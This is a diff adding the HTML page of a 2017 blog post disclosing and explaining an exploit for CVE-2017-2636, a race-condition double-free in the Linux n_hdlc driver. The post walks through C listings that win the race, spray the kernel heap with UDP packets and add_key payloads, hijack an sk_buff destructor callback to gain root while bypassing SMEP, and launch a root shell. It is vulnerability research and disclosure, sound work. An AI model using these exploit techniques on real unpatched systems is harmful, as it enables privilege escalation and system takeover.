@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/img/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/img/favicons/favicon-16x16.png">
+  <link rel="manifest" href="/img/favicons/site.webmanifest">
+  <link rel="shortcut icon" href="/img/favicons/favicon.ico">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="msapplication-config" content="/img/favicons/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>CVE-2017-2636: Exploit the race condition in the n_hdlc Linux kernel driver | Alexander Popov</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="CVE-2017-2636: Exploit the race condition in the n_hdlc Linux kernel driver" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This article discloses the exploitation of CVE-2017-2636, which is a race condition in the n_hdlc Linux kernel driver. My PoC exploit for x86_64 gains root privileges bypassing Supervisor Mode Execution Protection (SMEP)." />
+<meta property="og:description" content="This article discloses the exploitation of CVE-2017-2636, which is a race condition in the n_hdlc Linux kernel driver. My PoC exploit for x86_64 gains root privileges bypassing Supervisor Mode Execution Protection (SMEP)." />
+<link rel="canonical" href="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html" />
+<meta property="og:url" content="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html" />
+<meta property="og:site_name" content="Alexander Popov" />
+<meta property="og:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-03-24T09:18:54+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:image" content="https://a13xp0p0v.github.io/img/ava_bg.jpg" />
+<meta property="twitter:title" content="CVE-2017-2636: Exploit the race condition in the n_hdlc Linux kernel driver" />
+<meta name="twitter:site" content="@a13xp0p0v" />
+<script type="application/ld+json">
+{"headline":"CVE-2017-2636: Exploit the race condition in the n_hdlc Linux kernel driver","dateModified":"2017-03-24T09:18:54+00:00","description":"This article discloses the exploitation of CVE-2017-2636, which is a race condition in the n_hdlc Linux kernel driver. My PoC exploit for x86_64 gains root privileges bypassing Supervisor Mode Execution Protection (SMEP).","datePublished":"2017-03-24T09:18:54+00:00","url":"https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html","@type":"BlogPosting","image":"https://a13xp0p0v.github.io/img/ava_bg.jpg","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://a13xp0p0v.github.io/img/ava_bg.jpg"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://a13xp0p0v.github.io/feed.xml" title="Alexander Popov" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/"><img id="logo" src="/img/favicons/a13xp0p0v_ava.png" height="60px"> Alexander Popov</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/articles/">Articles</a><a class="page-link" href="/conference_talks/">Conference Talks</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CVE-2017-2636: Exploit the race condition in the n_hdlc Linux kernel driver</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2017-03-24T09:18:54+00:00" itemprop="datePublished">Mar 24, 2017
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This article discloses the exploitation of CVE-2017-2636, which is a race condition in the n_hdlc Linux kernel driver. My PoC exploit for x86_64 gains root privileges bypassing Supervisor Mode Execution Protection (SMEP).</p>
+
+<p>This driver (drivers/tty/n_hdlc.c) provides <code class="language-plaintext highlighter-rouge">HDLC</code> serial line discipline and comes as a kernel module in many Linux distributions, which have <code class="language-plaintext highlighter-rouge">CONFIG_N_HDLC=m</code> in the kernel config. So <a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-2636">RHEL 6/7</a>, <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1430049">Fedora</a>, <a href="https://bugzilla.novell.com/show_bug.cgi?id=CVE-2017-2636">SUSE</a>, <a href="https://security-tracker.debian.org/tracker/CVE-2017-2636">Debian</a>, and <a href="https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html">Ubuntu</a> were affected by <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-2636">CVE-2017-2636</a>.</p>
+
+<p>Currently the flaw is <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=82f2341c94d270421f383641b7cd670e474db56b">fixed</a> in the mainline Linux kernel (<a href="http://seclists.org/oss-sec/2017/q1/569">public disclosure</a>). The bug was <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8">introduced</a> quite a long time ago, so the patch is backported to the stable kernel versions too.</p>
+
+<p>I've managed to make the proof-of-concept exploit quite stable and fast. It crashes the kernel very rarely and gains the root shell in less than 20 seconds (at least on my machines). This PoC defeats SMEP, but doesn't cope with Supervisor Mode Access Prevention (SMAP), although it is possible with some additional efforts.</p>
+
+<p>My PoC also doesn't defeat Kernel Address Space Layout Randomization (KASLR) and needs to know the kernel code offset. This offset can be obtained using a kernel pointer leak or the prefetch side-channel <a href="https://gruss.cc/files/prefetch.pdf">attack</a> (see xairy's <a href="https://github.com/xairy/kernel-exploits/tree/master/prefetch-side-channel">implementation</a>).</p>
+
+<p>First of all let's watch the <a href="https://youtu.be/nDCvRxWxN0Y">demo video</a>!</p>
+<div style="position:relative;padding-top:56.25%;">
+  <iframe src="https://www.youtube.com/embed/nDCvRxWxN0Y" frameborder="0" allowfullscreen="" style="position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
+</div>
+<p><br /></p>
+
+<h2 id="the-n_hdlc-bug">The n_hdlc bug</h2>
+
+<p>Initially, <code class="language-plaintext highlighter-rouge">N_HDLC</code> line discipline used a self-made singly linked list for data buffers and had <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code> pointer for buffer retransmitting after an error. It worked, but the commit <code class="language-plaintext highlighter-rouge">be10eb75893</code> added data flushing and introduced racy access to <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code>.</p>
+
+<p>After tx error concurrent <a href="http://lxr.free-electrons.com/ident?i=flush_tx_queue"><code class="language-plaintext highlighter-rouge">flush_tx_queue()</code></a> and <a href="http://lxr.free-electrons.com/ident?i=n_hdlc_send_frames"><code class="language-plaintext highlighter-rouge">n_hdlc_send_frames()</code></a> both use <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code> and can put one buffer to <code class="language-plaintext highlighter-rouge">tx_free_buf_list</code> twice. That causes an exploitable double-free error in <a href="http://lxr.free-electrons.com/ident?i=n_hdlc_release"><code class="language-plaintext highlighter-rouge">n_hdlc_release()</code></a>. The data buffers are represented by <code class="language-plaintext highlighter-rouge">struct n_hdlc_buf</code> and allocated in the <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> slab cache.</p>
+
+<p>For fixing this bug, I <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=82f2341c94d270421f383641b7cd670e474db56b">used</a> a standard kernel linked list and got rid of racy <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code>: in case of tx error the current <code class="language-plaintext highlighter-rouge">n_hdlc_buf</code> item is put after the head of <code class="language-plaintext highlighter-rouge">tx_buf_list</code>.</p>
+
+<p>I started the investigation when got a suspicious kernel crash from <a href="https://github.com/google/syzkaller">syzkaller</a>. It is a really great project, which helped to fix an <a href="https://github.com/google/syzkaller/wiki/Found-Bugs">impressively big list</a> of bugs in Linux kernel.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>This article is the only way for me to publish the exploit code. So, please, be patient and prepare to plenty of listings!</p>
+
+<h1 id="winning-the-race">Winning the race</h1>
+
+<p>Let's look to the code of the main loop: going to race till success.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
+	<span class="kt">long</span> <span class="n">tmo1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">long</span> <span class="n">tmo2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">loop</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">tmo1</span> <span class="o">=</span> <span class="n">loop</span> <span class="o">%</span> <span class="n">MAX_RACE_LAG_USEC</span><span class="p">;</span>
+	<span class="k">else</span>
+		<span class="n">tmo2</span> <span class="o">=</span> <span class="n">loop</span> <span class="o">%</span> <span class="n">MAX_RACE_LAG_USEC</span><span class="p">;</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">loop</code> counter is incremented every iteration, so <code class="language-plaintext highlighter-rouge">tmo1</code> and <code class="language-plaintext highlighter-rouge">tmo2</code> variables are changing too. They are used for making lags in the racing threads, which:</p>
+<ol>
+  <li>synchronize at the <code class="language-plaintext highlighter-rouge">pthread_barrier</code>,</li>
+  <li>spin the specified number of microseconds in a busy loop,</li>
+  <li>interact with <code class="language-plaintext highlighter-rouge">n_hdlc</code>.</li>
+</ol>
+
+<p>Such a way of colliding threads helps to hit the race condition earlier.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="n">ptmd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/ptmx"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ptmd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] open /dev/ptmx"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">ptmd</span><span class="p">,</span> <span class="n">TIOCSETD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldisc</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] TIOCSETD"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span></code></pre></figure>
+
+<p>Here we open a pseudoterminal master and slave pair and set the <code class="language-plaintext highlighter-rouge">N_HDLC</code> line discipline for it. For more information about that, see <code class="language-plaintext highlighter-rouge">man ptmx</code>, <a href="http://lxr.free-electrons.com/source/Documentation/serial/tty.txt"><code class="language-plaintext highlighter-rouge">Documentation/serial/tty.txt</code></a> and <a href="https://unix.stackexchange.com/questions/117981/what-are-the-responsibilities-of-each-pseudo-terminal-pty-component-software">this</a> great discussion about <code class="language-plaintext highlighter-rouge">pty</code> components.</p>
+
+<p>Setting <code class="language-plaintext highlighter-rouge">N_HDLC</code> ldisc for a serial line causes the <code class="language-plaintext highlighter-rouge">n_hdlc</code> kernel module autoloading. You can get the same effect using <code class="language-plaintext highlighter-rouge">ldattach</code> daemon.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="n">ret</span> <span class="o">=</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">ptmd</span><span class="p">,</span> <span class="n">TCXONC</span><span class="p">,</span> <span class="n">TCOOFF</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] TCXONC TCOOFF"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">bytes</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">ptmd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">TTY_BUF_SZ</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">bytes</span> <span class="o">!=</span> <span class="n">TTY_BUF_SZ</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] write to ptmx (bytes)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span></code></pre></figure>
+
+<p>Here we suspend the pseudoterminal output (see <code class="language-plaintext highlighter-rouge">man tty_ioctl</code>) and write one data buffer. The <code class="language-plaintext highlighter-rouge">n_hdlc_send_frames()</code> fails to send this buffer and saves its address in <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code>.</p>
+
+<p>We are ready for the race. Start two threads, which are allowed to run on all available CPU cores:</p>
+<ul>
+  <li>thread 1: flush the data with <code class="language-plaintext highlighter-rouge">ioctl(ptmd, TCFLSH, TCIOFLUSH)</code>;</li>
+  <li>thread 2: start the suspended output with <code class="language-plaintext highlighter-rouge">ioctl(ptmd, TCXONC, TCOON)</code>.</li>
+</ul>
+
+<p>In a lucky case, they both put the only written buffer pointed by <code class="language-plaintext highlighter-rouge">n_hdlc.tbuf</code> to <code class="language-plaintext highlighter-rouge">tx_free_buf_list</code>.</p>
+
+<p>Now we return to the CPU 0 and trigger possible double-free error:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="n">ret</span> <span class="o">=</span> <span class="n">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">single_cpu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">single_cpu</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] sched_setaffinity"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">close</span><span class="p">(</span><span class="n">ptmd</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] close /dev/ptmx"</span><span class="p">);</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+	<span class="p">}</span></code></pre></figure>
+
+<p>We close the pseudoterminal master. The <code class="language-plaintext highlighter-rouge">n_hdlc_release()</code> goes through <code class="language-plaintext highlighter-rouge">n_hdlc_buf_list</code> items and frees the kernel memory used for data buffers. Here the possible double-free error happens.</p>
+
+<p>This particular bug is successfully detected by the Kernel Address Sanitizer (<a href="https://lwn.net/Articles/612153/">KASAN</a>), which reports the use-after-free happening just before the second <code class="language-plaintext highlighter-rouge">kfree()</code>.</p>
+
+<p>The final part of the main loop:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="n">ret</span> <span class="o">=</span> <span class="n">exploit_skb</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="n">sockaddrs</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">loop</span> <span class="o">%</span> <span class="n">SOCK_PAIRS</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="n">EXIT_SUCCESS</span><span class="p">)</span>
+		<span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] race #%ld: WIN! flush(%ld), TCOON(%ld)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+						<span class="n">loop</span><span class="p">,</span> <span class="n">tmo1</span><span class="p">,</span> <span class="n">tmo2</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span> <span class="cm">/* :) */</span>
+	<span class="p">}</span>
+
+	<span class="n">loop</span><span class="o">++</span><span class="p">;</span>
+<span class="err">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] finish as: uid=0, euid=0, start sh...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">run_sh</span><span class="p">();</span></code></pre></figure>
+
+<p>Here we try to exploit the double-free error by overwriting <code class="language-plaintext highlighter-rouge">struct sk_buff</code>. In case of success, we exit from the main loop and run the root shell in the child process using <code class="language-plaintext highlighter-rouge">execve()</code>.</p>
+
+<h1 id="exploiting-the-sk_buff">Exploiting the sk_buff</h1>
+
+<p>As I mentioned, the doubly freed <code class="language-plaintext highlighter-rouge">n_hdlc_buf</code> item is allocated in the <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> slab cache. For exploiting double-free error for this cache, we need some kernel objects with the size a bit less than 8 kB. Actually, we need two types of such objects:</p>
+<ul>
+  <li>one containing some function pointer,</li>
+  <li>another one with the controllable payload, which can overwrite that pointer.</li>
+</ul>
+
+<p>Searching for such kernel objects and experimenting with them was not easy and took me some time. Finally, I've chosen <code class="language-plaintext highlighter-rouge">sk_buff</code> with its <code class="language-plaintext highlighter-rouge">destructor_arg</code> in <code class="language-plaintext highlighter-rouge">struct skb_shared_info</code>. This approach is not new – consider reading the cool write-up about <a href="https://xairy.github.io/blog/2016/cve-2016-2384">CVE-2016-2384</a>.</p>
+
+<p>The network-related buffers in Linux kernel are represented by <code class="language-plaintext highlighter-rouge">struct sk_buff</code>. See <a href="http://vger.kernel.org/~davem/skb_data.html">these</a> great pictures describing <code class="language-plaintext highlighter-rouge">sk_buff</code> data layout. The most important for us is that the network data and <code class="language-plaintext highlighter-rouge">skb_shared_info</code> are placed in the same kernel memory block pointed by <code class="language-plaintext highlighter-rouge">sk_buff.head</code>. So creating a 7500-byte network packet in the userspace will make <code class="language-plaintext highlighter-rouge">skb_shared_info</code> be allocated in the <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> slab cache. Exactly like we want.</p>
+
+<p>But there is one challenge: <code class="language-plaintext highlighter-rouge">n_hdlc_release()</code> frees 13 <code class="language-plaintext highlighter-rouge">n_hdlc_buf</code> items straight away. At first I was trying to do the heap spray in parallel with <code class="language-plaintext highlighter-rouge">n_hdlc_release()</code>, but didn't manage to inject the corresponding <code class="language-plaintext highlighter-rouge">kmalloc()</code> between the needed <code class="language-plaintext highlighter-rouge">kfree()</code> calls. So I used another way: spraying <strong>after</strong> <code class="language-plaintext highlighter-rouge">n_hdlc_release()</code> can give two <code class="language-plaintext highlighter-rouge">sk_buff</code> items with the <code class="language-plaintext highlighter-rouge">head</code> pointing to the same memory. That's promising.</p>
+
+<p>So we need to spray hard but keep 8 kB UDP packets allocated to avoid mess in the allocator freelist. Socket queues are limited in size, so I've created a lot of sockets using <code class="language-plaintext highlighter-rouge">socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)</code>:</p>
+<ul>
+  <li>one client socket for sending UDP packets,</li>
+  <li>one dedicated server socket, which is likely to receive two packets with the same <code class="language-plaintext highlighter-rouge">sk_buff.head</code>,</li>
+  <li>200 server sockets for receiving other packets emitted during heap spray,</li>
+  <li>200 server sockets for receiving the packets emitted during slab exhaustion.</li>
+</ul>
+
+<p>Ok. Now we need another kernel object for overwriting the function pointer in <code class="language-plaintext highlighter-rouge">skb_shared_info.destructor_arg</code>. We can't use <code class="language-plaintext highlighter-rouge">sk_buff.head</code> for that again, because <code class="language-plaintext highlighter-rouge">skb_shared_info</code> is placed at the same offset in <code class="language-plaintext highlighter-rouge">sk_buff.head</code> and we don't control it. I was really happy to find that <code class="language-plaintext highlighter-rouge">add_key</code> syscall is able to allocate the controllable data in the <code class="language-plaintext highlighter-rouge">kmalloc-8192</code> too.</p>
+
+<p>But I became upset when encountered key data quotas in <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/keys/</code> owned by root. The default value of <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/keys/maxbytes</code> is 20000. It means that only 2 <code class="language-plaintext highlighter-rouge">add_key</code> syscalls can concurrently store our 8 kB payload in the kernel memory, and that's not enough.</p>
+
+<p>But the happiness returned when I encountered the bright idea at the <a href="https://speakerdeck.com/retme7/talk-is-cheap-show-me-the-code">slides</a> of Di Shen from <a href="http://keenlab.tencent.com/en/">Keen Security Lab</a>: I can make the heap spray successful even if <code class="language-plaintext highlighter-rouge">add_key</code> fails!</p>
+
+<p>So, let's look at the <code class="language-plaintext highlighter-rouge">init_payload()</code> code:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define MMAP_ADDR		0x10000lu
+#define PAYLOAD_SZ		8100
+#define SKB_END_OFFSET		7872
+#define KEY_DATA_OFFSET		18
+</span>
+<span class="kt">int</span> <span class="nf">init_payload</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="o">*</span><span class="n">info</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="o">*</span><span class="p">)(</span><span class="n">p</span> <span class="o">+</span>
+					<span class="n">SKB_END_OFFSET</span> <span class="o">-</span> <span class="n">KEY_DATA_OFFSET</span><span class="p">);</span>
+	<span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="n">uinfo_p</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span></code></pre></figure>
+
+<p>The definition of <code class="language-plaintext highlighter-rouge">struct skb_shared_info</code> and <code class="language-plaintext highlighter-rouge">struct ubuf_info</code> is copied to the exploit code from <a href="http://lxr.free-electrons.com/source/include/linux/skbuff.h"><code class="language-plaintext highlighter-rouge">include/linux/skbuff.h</code></a> kernel header.</p>
+
+<p>The payload buffer will be passed to <code class="language-plaintext highlighter-rouge">add_key</code> as a parameter, and the data which we put there at <code class="language-plaintext highlighter-rouge">7872 - 18 = 7854</code> byte offset will exactly overwrite <code class="language-plaintext highlighter-rouge">skb_shared_info</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c">	<span class="kt">char</span> <span class="o">*</span><span class="n">area</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="kt">void</span> <span class="o">*</span><span class="n">target_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MMAP_ADDR</span><span class="p">);</span>
+
+	<span class="n">area</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
+			<span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">area</span> <span class="o">!=</span> <span class="n">target_addr</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"[-] mmap</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">uinfo_p</span> <span class="o">=</span> <span class="n">target_addr</span><span class="p">;</span>
+	<span class="n">uinfo_p</span><span class="o">-&gt;</span><span class="n">callback</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">root_it</span><span class="p">;</span>
+
+	<span class="n">info</span><span class="o">-&gt;</span><span class="n">destructor_arg</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">uinfo_p</span><span class="p">;</span>
+	<span class="n">info</span><span class="o">-&gt;</span><span class="n">tx_flags</span> <span class="o">=</span> <span class="n">SKBTX_DEV_ZEROCOPY</span><span class="p">;</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">ubuf_info.callback</code> is called in <a href="http://lxr.free-electrons.com/ident?i=skb_release_data"><code class="language-plaintext highlighter-rouge">skb_release_data()</code></a> if <code class="language-plaintext highlighter-rouge">skb_shared_info.tx_flags</code> has <code class="language-plaintext highlighter-rouge">SKBTX_DEV_ZEROCOPY</code> flag set to 1. In our case, <code class="language-plaintext highlighter-rouge">ubuf_info</code> item resides in the userspace memory, so dereferencing its pointer in the kernelspace will be detected by SMAP.</p>
+
+<p>Anyway, now the <code class="language-plaintext highlighter-rouge">callback</code> points to <code class="language-plaintext highlighter-rouge">root_it()</code>, which does the classical <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code>. However, this shellcode resides in the userspace too, so executing it in the kernelspace will be detected by SMEP. We are going to bypass it soon.</p>
+
+<h1 id="heap-spraying-and-stabilization">Heap spraying and stabilization</h1>
+
+<p>As I mentioned, <code class="language-plaintext highlighter-rouge">n_hdlc_release()</code> frees thirteen <code class="language-plaintext highlighter-rouge">n_hdlc_buf</code> items. Our <code class="language-plaintext highlighter-rouge">exploit_skb()</code> is executed shortly after that. Here we do the actual heap spraying by sending twenty 7500-byte UDP packets. Experiments showed that the packets number 12, 13, 14, and 15 are likely to be exploitable, so they are sent to the dedicated server socket.</p>
+
+<p>Now we are going to perform the use-after-free on <code class="language-plaintext highlighter-rouge">sk_buff.data</code>:</p>
+<ul>
+  <li>receive 4 network packets on the dedicated server socket one by one,</li>
+  <li>execute several <code class="language-plaintext highlighter-rouge">add_key</code> syscalls with our payload after receiving each of them.</li>
+</ul>
+
+<p>The exact number of <code class="language-plaintext highlighter-rouge">add_key</code> syscalls giving the best results was found empirically by testing the exploit many times. The example of <code class="language-plaintext highlighter-rouge">add_key</code> call:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">k</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_add_key</span><span class="p">,</span> <span class="s">"user"</span><span class="p">,</span> <span class="s">"payload0"</span><span class="p">,</span>
+			<span class="n">payload</span><span class="p">,</span> <span class="n">PAYLOAD_SZ</span><span class="p">,</span> <span class="n">KEY_SPEC_PROCESS_KEYRING</span><span class="p">);</span></code></pre></figure>
+
+<p>If we won the race and did the heap spraying luckily, then our shellcode is executed when the poisoned packet is received. After that we can invalidate the keys that were successfully allocated in the kernel memory:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">KEYS_N</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="n">syscall</span><span class="p">(</span><span class="n">__NR_keyctl</span><span class="p">,</span> <span class="n">KEYCTL_INVALIDATE</span><span class="p">,</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="p">}</span></code></pre></figure>
+
